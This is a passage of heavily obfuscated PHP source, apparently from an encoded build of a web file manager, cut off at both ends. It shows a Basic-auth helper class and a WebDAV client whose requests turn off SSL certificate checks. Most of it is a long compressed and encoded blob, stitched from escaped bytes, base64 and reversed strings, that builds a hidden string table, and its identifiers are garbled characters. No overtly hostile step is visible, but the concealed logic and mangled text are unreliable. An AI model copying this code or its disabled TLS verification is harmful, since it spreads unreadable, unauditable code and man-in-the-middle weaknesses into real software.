$Càåçó¹„š[1656] . $CÁ²áêå¢œ, $Càåçó¹„š[1657]); } } $AÔœî³®ï– = is_null($B’‡•àê´) ? $AÔœî³®ï– : $B’‡•àê´; } goto D”«í§õ»Û; bó—ÅÈŸÃ: if (!isset($c­Û±¨ÊÊ‹[$BÅ©ºŠÚ“])) { return $AÔœî³®ï–; } $cÂË±ïÑ« = $c­Û±¨ÊÊ‹[$BÅ©ºŠÚ“]; if (!is_array($cÂË±ïÑ«) || count($cÂË±ïÑ«) == 0) { return $AÔœî³®ï–; } goto a¾ƒªãĞ›¨; D”«í§õ»Û: return $AÔœî³®ï–; goto aÖ¢“¤Úù‰; aÖ¢“¤Úù‰: } } class HttpAuth { public static function get() { $DŞÌÕÁ«‘ =& $_SERVER[÷ÖêïÔÔÓ]; $föÕÍ”Œ•• = $DŞÌÕÁ«‘[33]; $bœŸõáàîÃ = $DŞÌÕÁ«‘[33]; if (isset($_SERVER[$DŞÌÕÁ«‘[1658]])) { $föÕÍ”Œ•• = $_SERVER[$DŞÌÕÁ«‘[1658]]; $bœŸõáàîÃ = $_SERVER[$DŞÌÕÁ«‘[1659]]; } elseif (isset($_SERVER[$DŞÌÕÁ«‘[1660]])) { $d°£·×òƒ = $_SERVER[$DŞÌÕÁ«‘[1660]]; if (strpos(strtolower($d°£·×òƒ), $DŞÌÕÁ«‘[1661]) === 0) { $f™ÙÆ¿á‚ = explode($DŞÌÕÁ«‘[4], base64_decode(substr($d°£·×òƒ, 6))); $föÕÍ”Œ•• = isset($f™ÙÆ¿á‚[0]) ? $f™ÙÆ¿á‚[0] : $DŞÌÕÁ«‘[33]; $bœŸõáàîÃ = isset($f™ÙÆ¿á‚[1]) ? $f™ÙÆ¿á‚[1] : 0; } } return array($DŞÌÕÁ«‘[527] => $föÕÍ”Œ••, $DŞÌÕÁ«‘[893] => $bœŸõáàîÃ); } public static function error() { goto CƒÎ×…«·ß; CƒÎ×…«·ß: $fé“„ôñ‘Ê =& $_SERVER[÷ÖêïÔÔÓ]; header($fé“„ôñ‘Ê[1662]); header($fé“„ôñ‘Ê[1663]); goto DâİÄ‚£•Á; DâİÄ‚£•Á: header($fé“„ôñ‘Ê[1664]); header($fé“„ôñ‘Ê[1665]); header($fé“„ôñ‘Ê[1666]); goto bƒ¬Àßš; bƒ¬Àßš: die; goto b‚ÖªÁŠß»; b‚ÖªÁŠß»: } public static function make($Aç‡îÃ±, $e«ø­ˆ¡) { $Fİ‘½Ì©šÜ =& $_SERVER[÷ÖêïÔÔÓ]; return $Fİ‘½Ì©šÜ[1667] + base64_encode($Aç‡îÃ± . $Fİ‘½Ì©šÜ[4] . $e«ø­ˆ¡); } } class HttpDavClient { public function __construct($DÉËŒ—éİì, $DÈÓÜêÎ³ò, $aß›Ï„Ñ˜«) { $this->header = array(); $this->userName = $DÈÓÜêÎ³ò; $this->userPassowrd = $aß›Ï„Ñ˜«; } protected function makePath($aËõÍí—…Ü) { return $aËõÍí—…Ü; } protected function setHeader($CĞ‘ŞíÒØî, $eº‹½ƒ‹–ğ = false) { if ($eº‹½ƒ‹–ğ === !1) { $this->header[] = $CĞ‘ŞíÒØî; } else { $this->header[] = $CĞ‘ŞíÒØî . $_SERVER[÷ÖêïÔÔÓ][876] . $eº‹½ƒ‹–ğ; } } public function move($C“Äùİ…, $B‚äĞÎ§¥É, $aìÊİ–·§ = '') { $A–¶Ù­™· =& $_SERVER[÷ÖêïÔÔÓ]; $this->setHeader($A–¶Ù­™·[1668], $this->makePath($B‚äĞÎ§¥É)); $this->setHeader($A–¶Ù­™·[1669], $A–¶Ù­™·[1670]); if ($aìÊİ–·§) { $this->setHeader($A–¶Ù­™·[1671], $A–¶Ù­™·[921] . $aìÊİ–·§ . $A–¶Ù­™·[924]); } return $this->send($A–¶Ù­™·[1672], $C“Äùİ…); } public function copy($Eä¤¿ÄË Î, $b¤÷ÕŠóø) { $E ›‘¶øÜ… =& $_SERVER[÷ÖêïÔÔÓ]; $this->setHeader($E ›‘¶øÜ…[1668], $this->makePath($b¤÷ÕŠóø)); $this->setHeader($E ›‘¶øÜ…[1669], $E ›‘¶øÜ…[1670]); return $this->send($E ›‘¶øÜ…[1673], $Eä¤¿ÄË Î); } public function mkcol($FÙ©ŒÊ¬¢ç) { $F˜…êöÄ°ï =& $_SERVER[÷ÖêïÔÔÓ]; $this->setHeader($F˜…êöÄ°ï[1669], $F˜…êöÄ°ï[1670]); return $this->send($F˜…êöÄ°ï[1674], $FÙ©ŒÊ¬¢ç); } public function delete($D¾„·âÇÀù, $a«†¯‚ª¢À = '') { $F÷ï¾Ôçİ˜ =& $_SERVER[÷ÖêïÔÔÓ]; if ($a«†¯‚ª¢À) { $this->setHeader($F÷ï¾Ôçİ˜[1671], $F÷ï¾Ôçİ˜[921] . $a«†¯‚ª¢À . $F÷ï¾Ôçİ˜[924]); } return $this->send($F÷ï¾Ôçİ˜[1675], $D¾„·âÇÀù); } public function propfind($bªîæ©´Ô) { $cµÄÛŠ± =& $_SERVER[÷ÖêïÔÔÓ]; $this->setHeader($cµÄÛŠ±[1676], $cµÄÛŠ±[493]); $this->setHeader($cµÄÛŠ±[1677], $cµÄÛŠ±[1678]); $Ašµœéê„ = $cµÄÛŠ±[1679]; return $this->send($cµÄÛŠ±[1680], $bªîæ©´Ô, $Ašµœéê„); } public function options($Aœ¼Ÿ›ÌÈ¸) { return $this->send($_SERVER[÷ÖêïÔÔÓ][1681], $Aœ¼Ÿ›ÌÈ¸); } public function get($eíŒğºàŞ) { return $this->send($_SERVER[÷ÖêïÔÔÓ][213], $eíŒğºàŞ); } public function put($Aã“ÀÊŠÂÍ, $A‚×¯ÛÍÜ, $BÏ°¶¹Ÿ½ù = '') { $bƒêÍ‡ÚÙ =& $_SERVER[÷ÖêïÔÔÓ]; if ($BÏ°¶¹Ÿ½ù) { $this->setHeader($bƒêÍ‡ÚÙ[1671], $bƒêÍ‡ÚÙ[921] . $BÏ°¶¹Ÿ½ù . $bƒêÍ‡ÚÙ[924]); } return $this->send($bƒêÍ‡ÚÙ[211], $Aã“ÀÊŠÂÍ, $A‚×¯ÛÍÜ); } protected function send($Bß¤©æ°…, $DîóÀ¸µ–·, $AÀ¦ÁòøôÀ = false, $a·°ô©–¿¥ = false) { goto e‡´œŒö¾; e‡´œŒö¾: $fˆ¡Ô³ì¶ =& $_SERVER[÷ÖêïÔÔÓ]; $A›â„ëæÊ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($fˆ¡Ô³ì¶[1682], $fˆ¡Ô³ì¶[50]); goto BÒÌµ›„”ö; fÀƒ‡ÌËÅæ: curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_HTTPHEADER, $this->header); curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_RETURNTRANSFER, !0); curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto C»„‰æÍ£â; c‹¹±âÓ·ç: $this->header = array(); return $E›¬ª±Â•£; goto bÕŸØ½øÕ; BÒÌµ›„”ö: $this->setHeader($A›â„ëæÊ); if ($AÀ¦ÁòøôÀ) { $AÀ¦ÁòøôÀ = $fˆ¡Ô³ì¶[1683] . $AÀ¦ÁòøôÀ; } if (!request_url_safe($DîóÀ¸µ–·)) { return !1; } goto dĞ¢İÌÙß°; C»„‰æÍ£â: curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_SSL_VERIFYHOST, !1); $E›¬ª±Â•£ = curl_exec($bÙÊ®ÙÏÖ®); goto c‹¹±âÓ·ç; dĞ¢İÌÙß°: $bÙÊ®ÙÏÖ® = curl_init($DîóÀ¸µ–·); curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_CUSTOMREQUEST, $Bß¤©æ°…); curl_setopt($bÙÊ®ÙÏÖ®, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fÀƒ‡ÌËÅæ; bÕŸØ½øÕ: } } goto cº½ï„¿ùƒ; CÏìæ®÷Ş¥: if (!function_exists('_kodDe')) { function _kodDe($e°áÖÂƒ¤§) { $e°áÖÂƒ¤§ = base64_decode($e°áÖÂƒ¤§); $a¯‡®õ™À = strlen($e°áÖÂƒ¤§); $eéµÊ¦Ìã¨ = ''; $Eù–¤Ôïœß = ord($e°áÖÂƒ¤§[0]) - 30; for ($DÄª´ÀŞ‡ = 1; $DÄª´ÀŞ‡ < $a¯‡®õ™À; $DÄª´ÀŞ‡ += 2) { if ($DÄª´ÀŞ‡ + 1 < $a¯‡®õ™À) { $eéµÊ¦Ìã¨ .= chr(ord($e°áÖÂƒ¤§[$DÄª´ÀŞ‡ + 1]) + $Eù–¤Ôïœß); $eéµÊ¦Ìã¨ .= chr(ord($e°áÖÂƒ¤§[$DÄª´ÀŞ‡]) + $Eù–¤Ôïœß); } else { $eéµÊ¦Ìã¨ .= chr(ord($e°áÖÂƒ¤§[$DÄª´ÀŞ‡]) + $Eù–¤Ôïœß); } } return $eéµÊ¦Ìã¨; } } define("\367\326\352\357\324\324\217\323", "\246\242\267\302\347"); $_SERVER[÷ÖêïÔÔÓ] = explode("\174\3\174\1\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\325\70\167\111\70\312\307\175\66\213\111\210\355\254\44\137\271\234\330\216\54\311\261\210\155\11\111\216\223\130\216\130\111\53\151\155\111\53\357"."\256\144\73\7\67\51\224\253\334\167\133\256\162\7\10\345\54\167\313\121\216\162\224\53\55\360\175\4\222\100\200\162\225\253\34\375\317\75\263\222\14\364\317\17\107\63\157\336\314\316\361\346\315\233\231"."\367\336\374\355\276\323\317\371\353\232\35\327\154\277\146\307\347\361\317\232\35\300\277\273\340\360\264\323\167\335\16\375\267\143\356\350\336\300\16\215\173\235\371\213\205\137\315\232\67\321\364\353\361\255\333"."\235\270\241\153\371\246\174\264\345\310\136\355\147\167\135\151\135\172\327\41\247\275\365\304\37\233\206\112\263\243\255\37\135\373\331\47\157\356\276\40\372\13\347\236\3\256\132\367\76\373\146\136\31\366\54"."\373\364\341\201\327\167\274\175\373\123\332\167\276\351\246\63\233\116\76\340\260\147\156\371\360\37\57\356\275\361\316\265\147\337\246\35\336\362\345\203\275\67\245\167\371\345\212\223\16\371\366\260\317\135\267".base64_decode('Grcvb/6g+ciV4e22Pv8/13y57tGGC1cX1qrTP3jbdcAO9z83utuRv/9q7z+kbvuZ+/5Xn7np9A==')."\143\213\336\225\353\366\232\261\363\235\73\336\334\371\257\135\257\364\372\277\32\275\164\356\226\351\177\170\177\372\371\317\276\170\142\233\372\336\345\317\376\355\362\336\213\374\317\14\75\162\360\141\111\165\277"."\351\307\372\316\176\373\350\13\137\277\343\261\332\337\376\317\161\175\217\147\317\275\177\357\211\353\7\267\275\371\207\317\207\12\351\363\117\373\362\351\23\303\65\303\227\45\202\65\123\57\71\276\50\215\37"."\x7f\xfd\xe7\x17\xee\xf0\xf6\xc8\xb5\x6f\x59\x8f\x6f\x7f\xeb\xe\xc3\xef\x6c\x68\x7b\xf8\x89\x17\x57\x8c\x7e\xb9\x65\xe2\x93\xf6\xf\x5e\x49\x6e\x3b\xe4\xaf\xf3\xdf\xdd\xf5\xb3\xbd\xb6\x3d\x30\xf5\x36\xf7\x95\xca\x8c\xb9".strrev('12Ó5ÇRKuå#üVåî·l;sâ}"r¿mßéó…g¸®»ŒŠ¯!Ú~Sí¯«Ò÷¼¿Ú')."\40\241\347\123\132\32\207\265\74\376\165\341\37\163\64\253\131\52\16\307\372\2\221\130\270\77\30\364\205\42\61\122\242\230\236\323\223\44\124\120\14\45\107\12\57\250\206\11\76\45\26\27\53\350\5"."\x35\x6f\x83\x70\x40\x52\xb1\x94\xb8\x62\x92\x92\xbc\x9d\x31\xaf\x2f\xd8\x13\x58\x1e\x8b\x2c\xf\xfa\x8\x46\x3c\x36\x5a\x54\x8d\x9\x1c\x43\xc1\xb0\xa5\x18\x56\x44\xcb\xa9\xc\x63\xcc\x60\xf5\xea\xf4\x2d\xf6\xf7\x49\x91"."\220\273\57\354\366\104\374\201\76\14\366\4\172\173\375\221\112\170\50\320\323\323\351\366\54\251\114\11\206\334\213\173\335\22\250\137\126\215\151\371\224\136\53\35\203\123\216\221\352\160\240\113\123\263\111"."\x1c\xcc\x2b\xb4\x3a\xd6\x44\x81\x84\x22\x2c\x4\xc6\x20\x5f\xcc\x66\x71\xa4\x8f\x85\x48\xfd\xd5\x94\x52\xcc\x92\x3e\xf3\x8a\x91\x82\xa1\xe5\x14\xda\xf4\x25\xea\x4\x83\xe2\x80\x52\xb4\x74\x2d\x9f\xc0\x11\xdf\xb8\x65\x28".strrev('Ò==Ü‘÷õó„¦xµ6Ş«Ÿ!}ºÕ-1NE‰^Bº”Õ‚DO>=}…E\'šœÔ0œj')."\144\45\130\152\256\100\213\301\171\252\24\26\10\171\175\41\251\163\271\304\373\51\241\347\162\172\336\11\112\1\343\151\11\125\365\205\102\70\40\23\12\356\361\303\241\43\221\100\127\127\330\307\142\244\161"."\x47\xf7\x80\x9a\x34\x13\x2a\xb5\xc5\x92\xa9\xac\x15\x2b\x29\xd9\x22\x25\xd6\x11\xfc\x3b\x93\xfc\x90\x5f\xdd\x24\x4\x3c\xaa\xe5\xb5\x22\x21\x56\x52\x84\xae\x9b\x94\xe4\x4d\x36\x87\x48\x40\xa5\x81\x3c\x43\x2\x5\xe8\x64"."\166\201\251\126\302\301\266\166\374\273\200\40\305\143\60\115\65\254\230\232\117\350\111\55\117\46\144\7\231\174\204\4\25\53\343\65\64\200\107\12\324\235\11\275\60\321\253\227\110\153\122\132\126\355\141"."\363\55\245\147\223\252\301\343\5\220\135\114\41\315\322\126\11\271\373\212\71\21\205\105\23\31\55\233\64\350\64\375\41\114\123\265\54\120\177\223\126\261\277\220\325\225\144\130\65\130\265\213\10\322\245"."\x1b\x39\x2f\x98\xee\xa4\x7\x0\x91\x6b\xfd\x55\x12\x46\x28\x99\x27\x85\x86\xe3\x12\xe8\x50\x79\x32\xc5\xfc\x48\x98\x35\xc3\x49\x78\x58\xed\xe0\x9\x8e\xef\x87\x6\x17\x81\x7f\xea\x8\x43\x8b\x92\x2a\x66\xd4\x6c\x36\xa6".base64_decode('jqtkruSSs01afZcZ1/IuAMFRfyCWUcxMb3J2DOWifDKpjjsLmQIZbDaDCRHDnu7TLZ/AZrN6Qg==')."\41\110\31\313\52\204\325\174\262\13\364\42\151\233\76\226\107\275\124\120\125\322\54\257\54\45\245\136\151\271\324\335\252\265\62\202\113\152\251\11\316\351\62\126\216\25\111\173\237\303\114\6\264\306\11"."\5\324\220\270\72\156\221\36\221\26\44\62\212\1\306\254\255\150\245\34\363\10\303\50\24\262\132\102\261\64\75\357\322\23\226\152\71\114\313\120\25\122\132\315\2\11\216\77\234\271\365\70\27\235\65"."\36\75\157\201\151\353\210\30\112\336\114\251\206\303\107\210\271\125\2\235\312\70\27\105\363\152\146\101\67\65\370\231\126\111\261\54\45\221\201\263\236\27\337\366\3\370\132\76\253\345\325\12\134\167\42".base64_decode('oZqmA2Yx9KzDnc3qY46AoaU1kKe+rJqAI7VKlF0WNEM1aVRa3BshyKBWqiNoKOmc0ioVinHQMw==')."\x64\x36\x56\x81\x61\x6c\xf2\xf5\x56\x29\x1\xa3\xb2\x94\x2b\x9a\x96\xc3\x50\x1\xdb\xd1\xc0\x2\x47\x6\xcf\x9f\x72\xf4\xc2\xf1\xd4\xd4\xa4\x23\xc\xb8\x33\x1\x37\x37\xb4\x48\x80\x74\x24\x9a\x86\xa1\xdd\x91\x48\x30\xe6"."\357\2\213\160\237\57\326\353\216\170\272\111\265\55\45\115\353\334\3\170\56\53\222\2\227\71\2\105\13\22\132\37\350\43\16\14\352\143\252\1\76\334\71\321\52\215\350\311\270\76\356\244\111\20\31"."\116\46\212\14\173\264\140\71\102\112\76\15\373\47\76\141\251\46\135\103\102\113\175\241\130\70\320\25\31\160\207\310\372\234\7\75\75\116\313\202\171\263\216\220\232\4\175\233\260\150\211\112\1\166\13".strrev('[üVrhÚú™¢ÛP¹'."\n".'“¼Xu,YÊÁ§-ì´Xˆr@&{–Ãøõ¦ƒ³…M"3Å').strrev('t‹ëÖ$p¾ıÑß!X†VÓæ£Ô„ìKhÀ©2+%4& ¤s'."\r".'MJ6tjãÏ\\:‡ë:õ7_')."\7\274\44\267\317\355\345\255\153\165\271\170\304\144\261\36\35\117\71\332\220\101\374\63\104\106\6\54\375\151\65\241\147\165\103\311\102\146\102\351\110\245\223\73\255\245\70\167\366\3\1\205\174\4\263"."\x2f\x1e\x9\x6b\xb9\x2\x65\x3c\x56\xa6\x98\x8b\xb\x41\x17\x2f\x81\x30\x11\x30\x52\x8c\xdd\xe8\x6c\x25\xd1\xd\x12\x62\xb5\x9f\xd1\xd4\x45\x39\xa6\x2b\xdc\xc\xfe\xe7\xec\x31\xa9\xe7\x14\x2a\x59\xa2\x9\xa9\x26\xf1\x8c"."\304\240\172\133\112\267\252\360\245\311\62\54\35\102\15\33\112\257\152\145\164\62\61\322\52\255\122\221\325\215\326\62\251\146\125\332\113\31\225\256\27\100\134\52\261\316\53\30\152\112\43\344\12\344\43"."\0\347\334\125\63\103\40\23\224\127\150\174\0\212\225\34\140\161\106\254\230\234\231\303\210\260\276\166\365\367\364\304\74\201\276\10\20\55\61\144\40\344\217\370\50\261\270\275\61\267\47\310\326\41\76"."\114\4\1\116\273\112\266\205\41\245\46\201\237\163\306\317\131\51\135\255\40\253\304\141\300\343\12\172\336\124\35\11\122\132\222\63\125\214\261\240\214\243\126\344\340\2\355\270\103\311\255\162\344\124\113"."\161\260\252\333\327\55\51\42\56\330\176\62\4\234\11\146\301\2\11\366\13\164\221\14\6\302\44\103\7\204\2\231\42\256\32\244\36\301\176\222\224\23\206\177\261\217\0\247\322\65\117\151\44\264\62".base64_decode('EKYMrAjwDW2VwtvYQetDyh7PZbmYFNNs4xfT48OAeQGiU6q12sHHKtLt71sS6w14fT0xfx/gjg==').base64_decode('kUp4f9DrpoMvwjsDkW4btB+wkKXuHn85um+ZPxwJV00CsH5fWQrYQgVDvi7/Mhbt8vt6vOGYxw==').strrev('½	¶H„µfásI6„©(°§ê%F#¾Û1™Ú:Û‚V(VÙ‡Ñ€cñÙtÆ&à¥‰^î}8æéí').base64_decode('SKmVSWI5yiByCpmhSomIxbX4p05yhyWrEGOsID7BgqgZNA5EL/J9ifDlihrEIE6nmtIN9YcA7g==')."\x94\xc5\x8\xa3\x2c\xe\xe6\xd\x4f\x3\x23\xe0\x46\xbb\x56\x40\x9\x68\x44\x62\x74\x2e\x9a\x40\xca\x77\xd3\xea\xa4\xf8\x8e\x31\x16\x0\x5b\x6b\x37\xdc\x6f\xc6\x6\x42\x81\xbe\xc5\x24\xc3\x58\x46\xa5\x15\xf0\x93\xee\xaf"."\245\102\12\331\166\132\234\45\1\11\103\341\302\42\355\364\141\235\166\345\32\374\163\44\376\1\102\31\371\270\232\247\275\36\207\214\231\61\16\272\223\0\263\205\62\125\275\310\276\26\327\365\54\235\307"."\140\31\146\374\202\155\130\207\115\112\44\343\224\71\315\242\253\26\131\34\42\201\45\276\276\30\245\54\34\23\250\21\3\300\26\60\20\42\35\142\351\43\164\33\202\23\103\276\60\345\2\206\72\132\324".base64_decode('aHe5nLMIFatg/SGfd62Mjs2qHXTMcg6BQF39IhwlsajTFp1O8hcNlhsu2bVmR11r1BV11Xa0Dg==')._kodDe('MQqnAZiXtLTztGmZvaCVA1v57luaSH8vw23xXsX9sVblY3h1uXsn4ykyhb5who6gmnz7fCd7dfo=')."\xd5\xd7\x75\xd0\xef\x24\x8a\x6\xd8\x62\x25\x26\x58\x55\x93\xb3\x6a\x41\x95\x80\xd4\xc2\x50\xf2\x88\x25\xa\x8\x34\x61\x95\x56\xe0\xd0\xd5\x73\xd6\x52\x38\x18\x43\x35\xcd\x73\xc\x3a\xa2\xb3\x86\x3a\x84\x7c\x2\xa8\xfc"."\x5b\x40\xaa\x1\xfc\x39\xc3\xf0\xdc\x8e\x15\xb0\x65\x2c\x2b\x9c\xf7\x84\x3e\x8a\xf9\x4\xe7\xae\x70\x5e\xc4\x95\x4\xe1\x3\x5a\x3a\xcf\xa6\x10\x58\xd0\xd9\xd6\xd6\x2e\xd\xaf\x9e\x81\x7f\xd7\xd2\x81\x4c\xab\x74\x59\x86"."\347\123\6\241\316\142\136\33\245\133\367\274\72\112\2\272\105\351\73\256\132\143\52\45\17\0\267\305\1\161\320\55\30\110\22\142\131\44\277\221\57\360\155\220\212\366\4\244\25\205\30\24\273\306\130".base64_decode('LKnmyThNIdhmQimoYaGFsVjE3dnji1EOQzgxjSOu2MkOu0DTOEdl+0kuKcfEzisoVCqAO0620g==')."\xbb\x6a\xa3\xd1\xe2\xa0\x9a\x1c\x1a\x4\x4\xa9\x38\x52\x43\xab\x9b\xd7\xd6\x51\x21\xd7\x15\x5\xff\xd1\x8\xe6\x43\xe4\xcb\x5\x3e\xe\x26\x90\x99\x12\x16\x5b\x38\x2b\xce\x8d\x62\x8c\x93\xc1\x2a\xb0\x4d\xbf\x6e\xb0\xf5".strrev('€óyÊ¶ßø¢L;c°ãœ$dv>ºq'."\r".'TáYWfpô@ñ›ì—5Ğk”!-0he’–éiô¹Â')."\xb6\x3d\x7c\xdd\xf1\x7b\x1d\x64\x5c\xdc\xcb\x1c\x7e\x22\xae\xb3\x80\x46\xa5\x47\x5\xcc\x50\x8b\x42\x4d\xbd\x68\x24\x54\x86\x63\x93\x1b\x2c\xc5\x0\xcb\x10\x17\xd6\xa0\x58\x25\x9c\x0\x82\x46\xc8\xf0\x98\x40\x86\xcb\xa4"."\xc\x4\x38\x19\x1e\xc4\xc8\x5c\x8\x95\xf9\x6e\x5f\x66\x22\xa5\x4c\x24\x4d\x99\x97\x4e\x82\x7e\xaf\xac\x99\x5e\x24\xf1\xca\xb4\xaa\x56\x6\x6e\x99\xb3\xca\x84\x8c\xab\xdd\xa3\x96\xd4\xac\x4c\x2b\x2d\xd3\xb6\xc8\xb4\xe2".base64_decode('Mto5eEkl+gGFkEqgIJjuGRkOCBxdWgoM0tYz8VjmorOcNvRiIUi/JMRwZQiA15QBQrpuyXQrww==')."\x2\xbd\x8c\x97\xc0\xea\xf0\xd0\x52\x3e\xce\xbc\xf6\x6c\x21\x24\x4d\xc0\xf1\xf2\x3a\x60\x28\x4c\xef\x52\x4a\xe2\xb8\x56\x1d\xe3\xbc\x9d\x1e\xf8\xf9\x25\x3f\x5d\xe3\x82\x4f\xf9\x96\xa2\xfc\x0\x87\x77\x22\xaf\x44\x44\x49".base64_decode('h4XPgw0+/TYGh9TERILvSbzCJsceY+OMaK0awVQfZ0YNU6dMoUTLaYWQiI2gJiVc3qpAga8PcA==')."\xda\x87\xc1\xe\x52\x98\xd8\x14\x14\xe0\x7c\xa4\x48\xd6\x33\xc5\x4c\x50\xc9\x63\x8c\xde\x12\xa8\x14\x26\x54\x9b\x36\xda\x56\x2e\x8c\xf2\x49\x47\x5b\x26\xc1\x2\x64\x81\xc3\xc2\x11\x70\xf0\x61\x14\xa2\xe4\x47\xd3\x63\xb8".base64_decode('O2M5tg9g/VvGZ2B3B7X8hJYXd9ocyjkbH3hIwjyG+3iyMGYbfCcvkx2+DHZ5IwJD4ztSUHuYVQ==').base64_decode('qDspqazmdJI57FE+5/rBpiZGa0OIldBmRjF4L9N5BImXtcqEKDwqoKWUEmfqtjwC9ZvWBDuUEA==').base64_decode('gvZCcdQ7WaSb7dWqRcVpp5k9oDerhVFLI3rVKFrDJbB607MsKozHyg4FQFQYqZjt/ABXw83YGw==').base64_decode('EEOyYAQMJ5wkiyHzEhcYvvhAhonDAlKhnM/Z+HG1Na2cI5dBy6L8ozZ2U7ECERGESI4NZS2zwA==')."\x46\x22\xae\x18\x4e\x3\x94\xc6\x3f\xc2\x59\x36\x11\xf\x8a\xc\x30\x54\x8e\x61\x4e\x98\x96\x9a\xeb\xd1\xa9\xd4\x9\x69\xd7\x97\xd4\x2c\x8\x81\x9c\x48\xa7\xc7\x43\x1c\x51\x60\xc3\xc\x26\x14\x88\x9a\xe3\xac\xe8\xbf\xac".base64_decode('NkJyyTNsmNWYr7Me8UsnXxvElUW8hYFovOXwVgeHhJvMHLvmQUCnaekFniJEcbKQxAsVsFjnow==').base64_decode('GgLunUTrN+9ChEvyIlkVE6YzCzAIuFHkJm7DoOOMWwmPTABQBMEZF6ZHdtWYKv6Gr8QvKnFR8A==').base64_decode('+068xjiVZDJAz7PEcCWquH2vXhC6O2ZFCbHq6GDjzq+myuOTZsHTTcwkQibN1oVEVHoFUA3GRA==').base64_decode('r64yUuJrHr/eKxdI7fzjx6SmionAB5SztIyWV022mBhmNdbwY5KITRi1yx6i0EFWMN48sRsh1Q==').strrev('áéSÇ+"uU¦'."\0".'?œô2ê-Ã´ÁHm¿Ğ!•u+l³JĞİXFìàš;?Y'."\0".'›µ8M0ö6O').base64_decode('4mXjbK8kZgJEAReOycqkyawovsq8f8VDF9/47rWvnv8Fjj9+xb9+fdXGV/+4/gocnz1nPg6QMw==')."\346\65\73\255\251\242\260\163\312\262\367\317\372\307\343\373\165\235\160\325\163\157\115\377\42\176\307\263\303\63\216\236\73\247\250\334\162\315\33\57\257\57\25\337\370\374\226\306\306\351\277\254\31\0\177".base64_decode('v7xpyXdPZC6b1xG65vrdXvKd/krmhP0ziZ9lfv27Kf+e88aSN6/yPHvQuec+cEPu4uZ0fuunVw==')."\350\177\335\65\320\166\331\273\137\175\362\345\264\343\76\372\344\347\115\337\172\326\76\375\226\143\346\113\267\137\63\154\324\351\373\336\233\314\354\263\337\306\266\205\173\216\56\152\256\237\163\352\317\117\117"."\147\132\56\372\174\103\344\372\314\14\347\224\353\3\247\365\36\371\332\326\265\357\114\74\360\374\346\334\163\173\376\362\225\320\202\137\154\372\317\130\150\237\276\323\62\332\223\167\135\320\360\360\203\361\223"."\327\77\256\256\76\371\214\370\143\277\364\214\376\375\134\243\377\314\25\177\276\345\366\227\33\116\335\275\376\310\341\351\126\135\346\300\320\246\335\332\136\334\366\253\317\316\136\355\230\266\340\344\115\257\165"."\36\362\247\340\136\67\336\274\333\222\265\323\236\75\377\341\273\132\56\337\177\336\153\323\66\45\217\330\373\361\326\145\175\365\273\77\320\365\345\75\57\114\253\175\342\201\43\17\310\56\137\177\326\165\7"."\75\367\257\273\66\231\157\337\261\354\117\137\166\157\267\376\137\237\4\107\367\172\271\147\306\135\305\367\225\122\270\353\262\317\266\155\71\351\267\371\272\151\331\207\177\361\361\174\163\135\227\373\271\341\257"."\xa3\x33\x9e\x98\x71\xe3\x9c\xc3\x2e\x98\x71\xc6\xaf\x57\xd6\x17\x4e\x3b\x6b\x8f\xa7\x77\xde\xbc\xe7\x3f\x8a\x6f\xbe\xfb\xf3\x87\xef\xbc\xf3\x9a\x17\xb2\xd3\x3e\xf9\x22\x7f\xd3\x3\x43\xb9\x3a\xed\x85\x73\xf5\xeb\xb6\x7d"."\53\307\346\74\65\354\77\245\366\67\241\246\213\236\122\173\157\314\114\234\272\345\311\142\162\366\140\335\133\33\366\174\345\205\215\336\247\266\26\372\376\372\247\372\205\35\207\275\267\74\352\274\176\277\323"."\x96\x3c\xfe\x9b\xc4\xc8\x86\xa8\xb3\x3f\x72\xfc\xe1\x57\xfd\x73\xf9\xfe\x3\xc6\xe6\xe8\x94\xd2\x59\xdb\x9d\x3f\xff\x8e\x8f\xa7\x7b\xee\xdf\xf5\x80\x47\xf6\x5e\xba\xc6\x48\xdd\xf0\xf5\xde\xcd\x1d\xbf\x5d\xf2\xec\xdd\x53"."\xfe\x94\xe8\x78\xa9\xe5\xd0\xe3\xef\x78\xf9\xde\xdc\xbe\x9f\x6d\xbc\xfc\xe6\xad\x2f\xb7\x9c\xdb\xfc\xed\xdf\x36\xec\x70\x5f\x62\xe3\xe8\x19\xe7\xb4\x4f\xd9\x70\xe9\xc9\xd3\xfd\x1f\xc\x7e\xf4\x5a\x66\xdd\xda\x3d\x3f\xdf"."\375\225\236\15\77\37\174\156\207\344\215\276\51\117\337\267\373\322\103\233\306\27\55\372\346\216\343\343\327\75\20\74\154\303\336\73\36\177\322\143\317\377\217\121\270\57\366\304\366\137\75\375\330\262\133".base64_decode('L1l2yMvxP2gnACFiF22PLz4O7tVz6q1fdh7y+3mv7THx9G0HfnxpYdvJ7mc8ntdrRn8/9X8WjA==').strrev('m˜ùÿÏÉÕtıö!ó|g¼ÚÎ÷ÿw™ğİ^I=o]¼Ëf;®·Š/çı>¸¦[¥ë¿¿Ëh»Oz')."\211\327\277\360\366\255\72\365\322\325\27\256\77\375\301\323\147\76\41\137\270\340\317\257\370\42\213\42\237\337\277\323\357\353\116\332\373\227\107\16\27\16\272\314\273\364\233\137\336\176\165\313\246\203\137".base64_decode('2evxxmsvXPCBR959378veWtT7vhNL567qOGcO4Paoq7Xhva79/bsW443o8ffeeGLJzT89l+h3w==').base64_decode('DH3o2v/1O6+/ZMusI05ZOePx17ZFLjt6zRPTT5SWfnPEDhtP3/+G8zaccJ5R/9j+LWPPJu/q3Q==')."\347\342\47\136\170\253\351\357\353\277\270\154\366\265\341\303\76\270\366\215\215\333\177\273\303\103\112\307\61\327\265\274\336\334\275\142\337\377\13\271\37\131\277\177\172\273\5\227\76\73\174\337\56\313\127"."\x9c\xbb\xd3\xfd\xf7\x4d\xff\x5f\xcf\x9\x5f\x5f\x2a\x3d\xba\xd7\xff\x1d\x70\xef\x7d\x8f\x76\x5f\x72\x8a\xab\xb4\xab\x7e\xf1\x5f\x1e\xfd\xe4\x19\x97\x7f\xe2\xde\x9b\xfb\x5b\xb6\xcf\xb5\